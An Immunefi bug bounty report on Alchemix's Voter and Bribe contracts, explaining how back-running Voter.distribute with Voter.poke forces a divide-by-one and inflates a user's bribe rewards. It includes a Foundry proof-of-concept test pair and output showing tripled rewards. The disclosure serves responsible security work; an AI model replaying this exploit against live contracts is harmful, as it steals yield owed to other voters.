# 31249 - \[SC - Critical] malicious user can back-run Voterdistribute to ...

Submitted on May 15th 2024 at 19:58:42 UTC by @jasonxiale for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31249

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

In current implementation, `Voter.distribute` is used to distribute ALCX among gauges, during the call there is an issue that a malicious user can back-run `Voter.distribute` to steal reards.

## Vulnerability Details

During the `Voter.distribute` function, [Voter.\_distribute](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L359C14-L379) is called, and at the end of `Voter._distribute`, `IBribe.resetVoting` is called at \[<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L377>] [IBribe.resetVoting](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L332-L335) is defined as:

```solidity
345     /// @inheritdoc IBribe
346     function resetVoting() external {
347         require(msg.sender == voter);
348         totalVoting = 0;
349     }
```

**So it means that after calling `Voter.distribute`, `Bribe.totalVoting` will be set to 0.**

Then in `Bribe.earned`, `Bribe.totalVoting` is used in [Bribe.sol#L257-L261](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L255-L261) and [Bribe.sol#L268-L277](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L268-L277). One thing to note is that:

```solidity
270         // Prevent divide by zero
271         if (_priorSupply == 0) {
272             _priorSupply = 1;
273         }
```

So it means that if **\_priorSupply** will be set to **1** if it's 0. And `reward` depends on `_priorSupply` as:

```solidity
reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
```

To sum up:

1. During `Voter.distribute`, `Bribe.totalVoting` will be set to **0**
2. `Bribe.earned` depends of `Bribe.totalVoting` to calculate the amount of rewards. And if we can force `_priorSupply` to 1 while calculating the rewards, we will make more profilt. We can use `Voter.poke` to update the `checkpoint` after `Voter.distribute`.

## Impact Details

In current implementation, `Voter.distribute` is used to distribute ALCX among gauges, during the call there is an issue that a malicious user can back-run `Voter.distribute` to steal reards.

## References

Add any relevant links to documentation or code

## Proof of Concept

put the follow code in `src/test/Voting.t.sol` and run

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/$API_KEY --fork-block-number 17133822 --mc VotingTest --mt testAliceEpochRewards -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 2 tests for src/test/Voting.t.sol:VotingTest
[PASS] testAliceEpochRewardsNoPoke() (gas: 6888013)
Logs:
  earned                    : 33333333333333333333333
  earned                    : 33333333333333333333333
  bal.balanceOf(Alice)      : 33333333333333333333333
  bal.balanceOf(Bob)        : 0

[PASS] testAliceEpochRewardsPoke() (gas: 6969463)
Logs:
  earned                    : 100000000000000000000000
  earned                    : 100000000000000000000000
  bal.balanceOf(Alice)      : 100000000000000000000000
  bal.balanceOf(Bob)        : 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 86.68ms (116.98ms CPU time)
```

As we can from above, if Alice doesn't call `Voter.poke` after `Voter.distribute`, Alice will receive 33333333333333333333333 bal rewards.

And if Alice calls `Voter.poke` after `Voter.distribute`, Alice will receive 100000000000000000000000 bal rewards.

```solidity
    function testAliceEpochRewardsPoke() public {
        uint256 period = minter.activePeriod();

        hevm.warp(period + nextEpoch);
        hevm.roll(block.number + 1);

        deal(address(alcx), address(voter), TOKEN_100K);

        hevm.prank(address(voter));
        sushiGauge.notifyRewardAmount(TOKEN_100K);

        address Alice = address(0x11001100);
        address Bob   = address(0x22002200);
        address Chris = address(0x33003300);
        // Create a veALCX token and vote to trigger voter rewards
        uint256 tokenId1 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        uint256 tokenId3 = createVeAlcx(Chris, TOKEN_1, MAXTIME, false);
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;
        address[] memory gauges = new address[](1);
        gauges[0] = address(sushiGauge);

        hevm.prank(Alice);
        voter.vote(tokenId1, pools, weights, 0);
        hevm.prank(Bob);
        voter.vote(tokenId2, pools, weights, 0);
        hevm.prank(Chris);
        voter.vote(tokenId3, pools, weights, 0);

        address bribeAddress = voter.bribes(address(sushiGauge));
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        voter.distribute();
        hevm.prank(Alice);
        voter.poke(tokenId1);

        hevm.warp(block.timestamp + nextEpoch);

        address[] memory bribes = new address[](1);
        bribes[0]  = bribeAddress;
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        console2.log("earned                    :", IBribe(bribeAddress).earned(address(bal), tokenId1));
        console2.log("earned                    :", IBribe(bribeAddress).earned(address(bal), tokenId2));
        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("bal.balanceOf(Alice)      :", IERC20(bal).balanceOf(Alice));
        console2.log("bal.balanceOf(Bob)        :", IERC20(bal).balanceOf(Bob));
    }

    function testAliceEpochRewardsNoPoke() public {
        uint256 period = minter.activePeriod();

        hevm.warp(period + nextEpoch);
        hevm.roll(block.number + 1);

        deal(address(alcx), address(voter), TOKEN_100K);

        hevm.prank(address(voter));
        sushiGauge.notifyRewardAmount(TOKEN_100K);

        address Alice = address(0x11001100);
        address Bob   = address(0x22002200);
        address Chris = address(0x33003300);
        // Create a veALCX token and vote to trigger voter rewards
        uint256 tokenId1 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        uint256 tokenId3 = createVeAlcx(Chris, TOKEN_1, MAXTIME, false);
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;
        address[] memory gauges = new address[](1);
        gauges[0] = address(sushiGauge);

        hevm.prank(Alice);
        voter.vote(tokenId1, pools, weights, 0);
        hevm.prank(Bob);
        voter.vote(tokenId2, pools, weights, 0);
        hevm.prank(Chris);
        voter.vote(tokenId3, pools, weights, 0);

        address bribeAddress = voter.bribes(address(sushiGauge));
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        voter.distribute();

        hevm.warp(block.timestamp + nextEpoch);

        address[] memory bribes = new address[](1);
        bribes[0]  = bribeAddress;
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        console2.log("earned                    :", IBribe(bribeAddress).earned(address(bal), tokenId1));
        console2.log("earned                    :", IBribe(bribeAddress).earned(address(bal), tokenId2));
        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("bal.balanceOf(Alice)      :", IERC20(bal).balanceOf(Alice));
        console2.log("bal.balanceOf(Bob)        :", IERC20(bal).balanceOf(Bob));
    }
```
